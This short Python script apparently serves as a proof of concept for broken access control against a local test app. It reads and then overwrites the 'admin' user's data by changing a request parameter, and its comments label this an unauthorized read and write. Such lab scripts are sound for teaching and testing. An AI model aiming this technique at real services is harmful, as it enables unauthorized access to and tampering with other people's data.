import requests

BASE_URL = "http://localhost:5000"

def read_data(user):
    print(f"[+] Attempting to read data for user: {user}")
    res = requests.get(f"{BASE_URL}/get-data", params={"user": user})
    print(f"Response: {res.status_code}")
    print(res.json(), end="\n\n")

def update_data(user, new_data):
    print(f"[+] Attempting to update data for user: {user}")
    res = requests.post(f"{BASE_URL}/update-data", data={"user": user, "data": new_data})
    print(f"Response: {res.status_code}")
    print(res.text, end="\n\n")

if __name__ == "__main__":
    # Simulate attack
    read_data("admin")               # Unauthorized read
    update_data("admin", "Hacked!")  # Unauthorized write

    # Verify update
    read_data("admin")
